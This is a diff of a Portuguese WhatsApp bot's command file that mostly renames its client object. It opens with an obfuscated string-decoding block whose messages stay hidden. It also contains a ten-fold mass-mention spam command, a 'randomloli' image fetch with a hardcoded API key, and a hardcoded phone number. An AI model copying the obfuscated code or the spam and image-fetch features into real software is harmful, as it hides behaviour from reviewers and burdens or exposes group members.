_0x23764a(_0x5510d0,_0x31b233,_0x24278a,_0x23a441,_0x496c7b){return _0x1a25(_0x496c7b-0x235,_0x31b233);}var _0x55ed89={};function _0x5a231b(_0x5b645f,_0x49f084,_0x17eaa6,_0x17bf78,_0xb7286a){return _0x1a25(_0x17bf78- -0x33a,_0x5b645f);}function _0x1a766d(_0x1c8ff1,_0xdf4f40,_0x15926a,_0x31926a,_0x64e440){return _0x1a25(_0x31926a-0x214,_0x64e440);}function _0x1a25(_0x4d4875,_0x2805dd){var _0x22a4d4=_0x4e6e();return _0x1a25=function(_0x15f69f,_0x380f65){_0x15f69f=_0x15f69f-(-0x6e1*0x1+0x1*0x22c5+-0x1abd);var _0x3c4508=_0x22a4d4[_0x15f69f];if(_0x1a25['xPqZYy']===undefined){var _0x28b0e6=function(_0x2d9e7b){var _0x177857='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var _0x22ecfa='',_0x38df67='';for(var _0x1e76dc=-0x2fc+0xf62+-0x2e*0x45,_0xe9fc5e,_0x497d13,_0x74023f=-0x1ae1+0x1d04*-0x1+0x37e5;_0x497d13=_0x2d9e7b['charAt'](_0x74023f++);~_0x497d13&&(_0xe9fc5e=_0x1e76dc%(0x62+-0x162f+0x1*0x15d1)?_0xe9fc5e*(0xbd4+-0x181d+0xc89)+_0x497d13:_0x497d13,_0x1e76dc++%(-0x247f*0x1+0x197*0x6+0x565*0x5))?_0x22ecfa+=String['fromCharCode'](-0x23e+0x32d*0xa+0x1c85*-0x1&_0xe9fc5e>>(-(0x1d02+-0x76+0x232*-0xd)*_0x1e76dc&0x2c8*0xa+-0x1bd6+-0xc*-0x1)):0xa*-0x1a1+-0x1c*0xa9+0x22c6*0x1){_0x497d13=_0x177857['indexOf'](_0x497d13);}for(var _0x58fe1f=-0x407*-0x6+-0x3*0x28a+-0x108c,_0x1e8199=_0x22ecfa['length'];_0x58fe1f<_0x1e8199;_0x58fe1f++){_0x38df67+='%'+('00'+_0x22ecfa['charCodeAt'](_0x58fe1f)['toString'](0x1*0xe5+-0x6e2+0x60d*0x1))['slice'](-(-0x1283*0x1+-0x1*-0x634+0x41b*0x3));}return decodeURIComponent(_0x38df67);};var _0x34e71c=function(_0x109a33,_0x1f4430){var _0x5da1c4=[],_0x5f47b0=0xff*-0x11+-0x1*-0x44d+-0x1*-0xca2,_0x3220aa,_0x47e0dc='';_0x109a33=_0x28b0e6(_0x109a33);var _0x2a1952;for(_0x2a1952=0xe3b+-0x962+-0x49*0x11;_0x2a1952<-0x23ce+-0x25ab+0x4a79*0x1;_0x2a1952++){_0x5da1c4[_0x2a1952]=_0x2a1952;}for(_0x2a1952=-0x1d31+0x260e+-0x8dd;_0x2a1952<0xb5*-0x35+0x1*-0xb12+0x318b*0x1;_0x2a1952++){_0x5f47b0=(_0x5f47b0+_0x5da1c4[_0x2a1952]+_0x1f4430['charCodeAt'](_0x2a1952%_0x1f4430['length']))%(-0x45*-0x67+-0x1b0c*-0x1+0x1db*-0x1d),_0x3220aa=_0x5da1c4[_0x2a1952],_0x5da1c4[_0x2a1952]=_0x5da1c4[_0x5f47b0],_0x5da1c4[_0x5f47b0]=_0x3220aa;}_0x2a1952=-0x1a13+0x5*-0x371+-0x8*-0x569,_0x5f47b0=0x806+-0x1fe+-0x608;for(var _0x50c8fe=0xab7*0x1+-0x62b+-0xc2*0x6;_0x50c8fe<_0x109a33['length'];_0x50c8fe++){_0x2a1952=(_0x2a1952+(-0x26f7+-0x1aa2+0x1*0x419a))%(0x1f3+0x1662+0x7c7*-0x3),_0x5f47b0=(_0x5f47b0+_0x5da1c4[_0x2a1952])%(-0x915*0x1+-0x59*0x19+0x10b*0x12),_0x3220aa=_0x5da1c4[_0x2a1952],_0x5da1c4[_0x2a1952]=_0x5da1c4[_0x5f47b0],_0x5da1c4[_0x5f47b0]=_0x3220aa,_0x47e0dc+=String['fromCharCode'](_0x109a33['charCodeAt'](_0x50c8fe)^_0x5da1c4[(_0x5da1c4[_0x2a1952]+_0x5da1c4[_0x5f47b0])%(0x41b+0x496+0xb*-0xb3)]);}return _0x47e0dc;};_0x1a25['oqjdVz']=_0x34e71c,_0x4d4875=arguments,_0x1a25['xPqZYy']=!![];}var _0x422472=_0x22a4d4[-0x1*-0x18bc+0x4fc*-0x2+0x12*-0xd2],_0x511a9c=_0x15f69f+_0x422472,_0x224681=_0x4d4875[_0x511a9c];return!_0x224681?(_0x1a25['vEyUKV']===undefined&&(_0x1a25['vEyUKV']=!![]),_0x3c4508=_0x1a25['oqjdVz'](_0x3c4508,_0x380f65),_0x4d4875[_0x511a9c]=_0x3c4508):_0x3c4508=_0x224681,_0x3c4508;},_0x1a25(_0x4d4875,_0x2805dd);}function _0x25451f(_0x388124,_0x244071,_0x32ce4c,_0x12e432,_0x231ccc){return _0x1a25(_0x32ce4c- -0x1c,_0x231ccc);}_0x55ed89[_0x5a231b('b01s',-0x1f1,-0x1f1,-0x1fe,-0x1ec)+'d']=ftoko,client[_0x1be2e6(0x102,'%j%v',0x10c,0xfb,0x10b)+_0x1be2e6(0x126,'dcMo',0xfa,0x11f,0x110)+'e'](from,_0x2c3804,MessageType[_0x1be2e6(0x10e,'VfJn',0x130,0x12e,0x119)+'ct'],_0x55ed89),fakegroup(_0x5a231b('Lc1o',-0x213,-0x1f8,-0x1fc,-0x202)+_0x25451f(0x13c,0x128,0x12d,0x11c,'*SVi')+_0x5a231b('@iQ9',-0x1fd,-0x1fd,-0x1ed,-0x1ea)+_0x23764a(0x392,'*SVi',0x38f,0x38f,0x37b)+_0x1be2e6(0x106,'Yx!i',0xf1,0x114,0x107)+_0x23764a(0x39b,'fDTz',0x38b,0x392,0x387)+_0x23764a(0x36b,'fDTz',0x358,0x375,0x36c)+_0x5a231b('RcRw',-0x201,-0x200,-0x211,-0x20c)+_0x25451f(0x118,0x107,0x10e,0x10d,'Q^)7')+_0x1a766d(0x333,0x328,0x343,0x33b,'VfJn')+_0x25451f(0x12a,0x134,0x124,0x11b,'PI52')+_0x5a231b('wTke',-0x1f3,-0x1f5,-0x1ee,-0x1f3)+_0x23764a(0x38b,'AWD]',0x379,0x37c,0x378)+_0x1a766d(0x34b,0x334,0x345,0x345,'4rNY')+_0x23764a(0x378,'$rGh',0x35c,0x361,0x36f)+_0x23764a(0x38d,'Xzit',0x39d,0x39a,0x388)+_0x1be2e6(0xf4,'Lc1o',0xf5,0xf2,0x104));
 					break
-				case 'setprefix':
-if (!isOwner) return 
-reply(`*Qual o tipo de prefixo vc deseja?*
-
-mensione a mensagem com a opção que deseja_
-
-_- [Multi] Se deseja MultiPrefix_
-_- [NoPref] se não deseja Prefix_
-_- [Custom] escreva o novo prefix que deseja usar_
-_- [Rest] devolver ao prefix principal_`)
-break
                                 case 'lolih':
                                   if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
                                         gatauda = body.slice(6)
                                                    return fakegroup (mess.wait)
                                         anu = await fetchJson(`https://tobz-api.herokuapp.com/api/randomloli?apikey=BotWeA`, {method: 'get'})
                                         buffer = await getBuffer(anu.result)
-                                        tomioka.sendMessage(from, buffer, image, {quoted: mek})
+                                        client.sendMessage(from, buffer, image, {quoted: mek})
                                         
                                         break
 				case 'marcar':
@@ -9891,7 +9132,7 @@ break
 						teks += `╠➥ https://wa.me/${mem.jid.split('@')[0]}\n`
 						members_id.push(mem.jid)
 					}
-					tomioka.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
+					client.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
 					break
                 case 'marcar4':
                     if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -9902,7 +9143,7 @@ break
 						teks += `╠➥ ${mem.jid.split('@')[0]}@s.whatsapp.net\n`
 						members_id.push(mem.jid)
 					}
-					tomioka.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
+					client.sendMessage(from, teks, text, {detectLinks: false, quoted: mek})
 					break
         ///_PROMOVER E REBAIXAR MARCANDO @
 				/*   case 'promover':
@@ -9917,10 +9158,10 @@ break
 							teks += `@${_.split('@')[0]}\n`
 						}
 						mentions(from, mentioned, true)
-						tomioka.groupRemove(from, mentioned)
+						client.groupRemove(from, mentioned)
 					} else {
 						mentions(`Promovido com sucesso @${mentioned[0].split('@')[0]} Como administrador do grupo!`, mentioned, true)
-						tomioka.groupMakeAdmin(from, mentioned)
+						client.groupMakeAdmin(from, mentioned)
 					}
 					break
 				case 'rebaixar':
@@ -9935,10 +9176,10 @@ break
 							teks += `@${_.split('@')[0]}\n`
 						}
 						mentions(teks, mentioned, true)
-						tomioka.groupRemove(from, mentioned)
+						client.groupRemove(from, mentioned)
 					} else {
 						mentions(`Voce foi rebaixado @${mentioned[0].split('@')[0]} Agora você é só mais um membro comum!`, mentioned, true)
-						tomioka.groupDemoteAdmin(from, mentioned)
+						client.groupDemoteAdmin(from, mentioned)
 					}
 					break */
 ///_PROMOVER E REBAIXAR MARCANDO MSG
@@ -9954,13 +9195,13 @@ var M_exe = []
 for (let cut of exe1) {
 M_exe.push(cut)
 }
-tomioka.groupDemoteAdmin(from, M_exe)
+client.groupDemoteAdmin(from, M_exe)
 } else {
-tomioka.groupDemoteAdmin(from, [exe1[0]])
+client.groupDemoteAdmin(from, [exe1[0]])
 }
 } else {
 exe1 = mek.message.extendedTextMessage.contextInfo.participant
-tomioka.groupDemoteAdmin(from, [exe1])
+client.groupDemoteAdmin(from, [exe1])
 }
 reply("ok, chefe esse cara perdeu o adm!")
 break
@@ -9977,13 +9218,13 @@ var M_exe = []
 for (let cut of exe1) {
 M_exe.push(cut)
 }
-tomioka.groupMakeAdmin(from, M_exe)
+client.groupMakeAdmin(from, M_exe)
 } else {
-tomioka.groupMakeAdmin(from, [exe1[0]])
+client.groupMakeAdmin(from, [exe1[0]])
 }
 } else {
 exe1 = mek.message.extendedTextMessage.contextInfo.participant
-tomioka.groupMakeAdmin(from, [exe1])
+client.groupMakeAdmin(from, [exe1])
 }
 reply("ok, chefe esse cara agora e admin!")
 break
@@ -10022,14 +9263,14 @@ description: `Title: ${hdata[i].title}\n\nUploader: ${hdata[i].author.name}`,
 ], title: num})
 num += 1
 }
-po = tomioka.prepareMessageFromContent(from, {
+po = client.prepareMessageFromContent(from, {
 "listMessage":{
 "title": "*YOUTUBE DOWNLOAD*",
 "description": `Mandado por : ${pushname}\n*Resultado da pesquisa : ${q}*\n*Baixe clicando no botão abaixo*`,
 "buttonText": "Result",
 "listType": "SINGLE_SELECT",
 "sections": datai}}, {}) 
-tomioka.relayWAMessage(po, {waitForAck: true})
+client.relayWAMessage(po, {waitForAck: true})
 break
 case 'sugerir':
                 if (args.length < 1) return fakegroup (`Oque você quer sugerir para meu criador?`)
@@ -10040,7 +9281,7 @@ case 'sugerir':
 				text: tks1,
 				contextInfo: {mentionedJid: [nmr]},
 				}
-				tomioka.sendMessage(`554498220867@s.whatsapp.net`, options, text, {quoted: ftoko})
+				client.sendMessage(`554498220867@s.whatsapp.net`, options, text, {quoted: ftoko ,contextInfo: tomis})
 				reply(`A sugestão foi relatada para meu criador, obrigado ${pushname}`)
 				break
 				case 'add':
@@ -10052,7 +9293,7 @@ case 'sugerir':
 					if (args[0].startsWith('08')) return fakegroup ('Use o código do país, man')
 					try {
 						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
-						tomioka.groupAdd(from, [num])
+						client.groupAdd(from, [num])
 					} catch (e) {
 						console.log('Error :', e)
 						reply('Falha ao adicionar destino, talvez porque é privado')
@@ -10070,15 +9311,15 @@ var M_exe = []
 for (let cut of exe1) {
 M_exe.push(cut)
 }
-tomioka.groupRemove(from, M_exe)
+client.groupRemove(from, M_exe)
 } else {
-tomioka.groupRemove(from, [exe1[0]])
+client.groupRemove(from, [exe1[0]])
 }
 } else {
 exe1 = mek.message.extendedTextMessage.contextInfo.participant
-tomioka.groupRemove(from, [exe1])
+client.groupRemove(from, [exe1])
 }
- tomioka.sendMessage("Alvo removido com sucesso")
+ client.sendMessage("Alvo removido com sucesso")
 break 
 				case 'banir':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
@@ -10093,10 +9334,10 @@ break
 							teks += `@${_.split('@')[0]}\n`
 						}
 						mentions(teks, mentioned, true)
-						tomioka.groupRemove(from, mentioned)
+						client.groupRemove(from, mentioned)
 					} else {
 						mentions(`Alvo removido com sucesso  : @${mentioned[0].split('@')[0]}`, mentioned, true)
-						tomioka.groupRemove(from, mentioned)
+						client.groupRemove(from, mentioned)
 					}
 					break
 				case 'admins':
@@ -10115,13 +9356,13 @@ break
                                         if (!isGroup) return fakegroup (mess.only.group)
                                         if (!isGroupAdmins) return fakegroup (mess.only.admin)
                                         if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
-                                        linkgc = await tomioka.groupInviteCode(from)
+                                        linkgc = await client.groupInviteCode(from)
                                         reply('https://chat.whatsapp.com/'+linkgc)
                                         break
                                 case 'leave':
                                         if (!isGroup) return fakegroup (mess.only.group)
                                         if (isGroupAdmins || isOwner) {
-                                            tomioka.groupLeave(from)
+                                            client.groupLeave(from)
                                         } else {
                                             reply(mess.only.admin)
                                         }
@@ -10130,7 +9371,7 @@ case 'notif':
 if (!isOwner) return reply('só dono')
 if (!isGroup) return reply('Só em grupo')
 teks = `Notificação de @${sender.split("@")[0]}\n*Mensagem : ${body.slice(7)}*`
-group = await tomioka.groupMetadata(from);
+group = await client.groupMetadata(from);
 member = group['participants']
 jids = [];
 member.map(async adm => {
@@ -10141,22 +9382,22 @@ text: teks,
 contextInfo: {
 mentionedJid: jids
 },
-quoted: ftoko
+quoted: ftoko ,contextInfo: tomis
 }
-await tomioka.sendMessage(from, options, text)
+await client.sendMessage(from, options, text)
 break
 				case 'toimg': 
 				if (!isQuotedSticker) return reply('❬ 📍 ❭ Marque alguma figurinha...')
 				if (mek.message.extendedTextMessage.contextInfo.quotedMessage.stickerMessage.isAnimated === true){
 					const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+					const media = await client.downloadAndSaveMediaMessage(encmedia)
 					const uploadn = await uploadimg(media, Date.now() + '.webp')
 					const anjj = await axios.get(`http://nzcha-apii.herokuapp.com/webp-to-mp4?url=${uploadn.result.image}`)
 					await sendMediaURL(from, anjj.data.result, 'Pronto')
 					fs.unlinkSync(media)
 				} else {
 					const encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
-					const media = await tomioka.downloadAndSaveMediaMessage(encmedia)
+					const media = await client.downloadAndSaveMediaMessage(encmedia)
 					ran = getRandom('.png')
 					exec(`ffmpeg -i ${media} ${ran}`, (err) => {
 						fs.unlinkSync(media)
@@ -10165,7 +9406,7 @@ break
 							fs.unlinkSync(ran)
 						} else {
 							buffer = fs.readFileSync(ran)
-							tomioka.sendMessage(from, buffer, image, { caption:mess.success,quoted: ftoko })
+							client.sendMessage(from, buffer, image, { caption:mess.success,quoted: ftoko ,contextInfo: tomis })
 							fs.unlinkSync(ran)
 						}
 					})
@@ -10207,7 +9448,7 @@ break
             var pc = body.slice(6)
             var nomor = pc.split("|")[0];
             var org = pc.split("|")[1];
-            tomioka.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
+            client.sendMessage(nomor+'@s.whatsapp.net', org, MessageType.text)   
             reply(`Conversa enviada com sucesso:\n${org},@${nomor}`)
 break
 
@@ -10248,7 +9489,7 @@ if (isAntiLink) return reply('*RECURSOS ANTILINK ESTÁ ATIVO*')
 antilink.push(from)
 fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
 reply('*「 ❗ 」recurso de antilink ativado✔️*')
-tomioka.sendMessage(from, `*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
+client.sendMessage(from, `*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
 } else if (Number(args[0]) === 0) {
 if (!isAntiLink) return reply('*Já está desativado!!*')
 antilink.splice(from)
@@ -10267,7 +9508,7 @@ if (isAntiLink) return reply('*RECURSOS ANTILINK ESTÁ ATIVO*')
 antilink.push(from)
 fs.writeFileSync('./database/json/antilink.json', JSON.stringify(antilink))
 reply('*「 ❗ 」recurso de antilink ativado✔️*')
-tomioka.sendMessage(from, `*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
+client.sendMessage(from, `*Atenção, antilink esta ativo, qualquer um que nao for adm mandar link, sera expulso do gp imediatamente.*`, text)
 
 case 'antilink0':
 if (!isAntiLink) return reply('*Já está desativado!!*')
@@ -10287,9 +9528,9 @@ break
 					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid[0]
 					let { jid, id, notify } = groupMembers.find(x => x.jid === mentioned)
 					try {
-						pp = await tomioka.getProfilePicture(id)
+						pp = await client.getProfilePicture(id)
 						buffer = await getBuffer(pp)
-						tomioka.updateProfilePicture(botNumber, buffer)
+						client.updateProfilePicture(botNumber, buffer)
 						mentions(`Foto do perfil atualizada com sucesso, usando a foto do perfil @${id.split('@')[0]}`, [jid], true)
 					} catch (e) {
 						reply('Putz, deu erro, a pessoa deve estar sem foto 😔')
@@ -10317,7 +9558,7 @@ break
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isadminbot) return fakegroup ('Quem é Você?')
 					var value = body.slice(9)
-					var group = await tomioka.groupMetadata(from)
+					var group = await client.groupMetadata(from)
 					var member = group['participants']
 					var mem = []
 					member.map( async adm => {
@@ -10328,14 +9569,14 @@ break
 					contextInfo: { mentionedJid: mem },
 					quoted: mek
 					}
-					tomioka.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
 					break
                     case 'hidetag10':
 				    if (!isUser) return fakegroup (`「 ❗ 」Registre-se primeiro\nMande o comando : ${prefix}rg`)
 					if (!isGroup) return fakegroup (mess.only.group)
 					if (!isadminbot) return fakegroup ('Quem é Você?')
 					var value = body.slice(10)
-					var group = await tomioka.groupMetadata(from)
+					var group = await client.groupMetadata(from)
 					var member = group['participants']
 					var mem = []
 					member.map( async adm => {
@@ -10346,24 +9587,24 @@ break
 					contextInfo: { mentionedJid: mem },
 					quoted: mek
 					}
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-					tomioka.sendMessage(from, options, text)
-                    tomioka.sendMessage(from, options, text)
-                    tomioka.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+					client.sendMessage(from, options, text)
+                    client.sendMessage(from, options, text)
+                    client.sendMessage(from, options, text)
 					break
 					//
 				case 'setpp3':
                     if (!isGroup) return fakegroup (mess.only.group)
                     if (!isfrendsowner) return fakegroup ('Quem é Você?')
                     if (!isBotGroupAdmins) return fakegroup (mess.only.Badmin)
-                    media = await tomioka.downloadAndSaveMediaMessage(mek)
-                    await tomioka.updateProfilePicture (from, media)
+                    media = await client.downloadAndSaveMediaMessage(mek)
+                    await client.updateProfilePicture (from, media)
                     reply('Alterado com sucesso o ícone do Grupo')
                     break
 				case 'wait':
@@ -10371,9 +9612,9 @@ break
 					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
 						return fakegroup (mess.wait)
 						const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
-						media = await tomioka.downloadMediaMessage(encmedia)
+						media = await client.downloadMediaMessage(encmedia)
 						await wait(media).then(res => {
-							tomioka.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
+							client.sendMessage(from, res.video, video, {quoted: mek, caption: res.teks.trim()})
 						}).catch(err => {
 							reply(err)
 						})
@@ -10395,15 +9636,6 @@ break
 reply(tesf)
 }
 
-					/*if (body == `${prefix}${command}`) {
-hsl = `        ────────────────\nOlá @${sender.split("@")[0]}!!\nO comando: ${prefix}${command} não existe\n\ndesculpe esse comando nao existe 📝\nSe não está no ${prefix}menu é porque não tem, lamento ...😔\n        ────────────────`
-tomioka.sendMessage(from, hsl, text, {quoted: ftoko, contextInfo: {mentionedJid: [sender]}, quoted: { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "status@broadcast" } : {}) }, message: { "imageMessage": { "url": "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc", "mimetype": "image/jpeg","caption": `${waktoonyabro}\n.....comando não tem :(....`, 'jpegThumbnail': fs.readFileSync('./assets/inter.webp')}}}})
-}*/
-/*if (body.startsWith(`/${command}`)){
-reply(`Comando ${command} NÃo Encontrado, Pesquisando Alguma Coisa Sobre Isso!!`)
-data = (`${prefix}img ${command}`)
-tomioka.sendMessage(from, data, MessageType.image, {mimetype: 'image/jpeg' ,quoted: mek, caption: `Pesquisa Feita Sobre ${command}`})		
-}*/
 				}
 		} catch (e) {
 			console.log('Error : %s', color(e, 'red'))
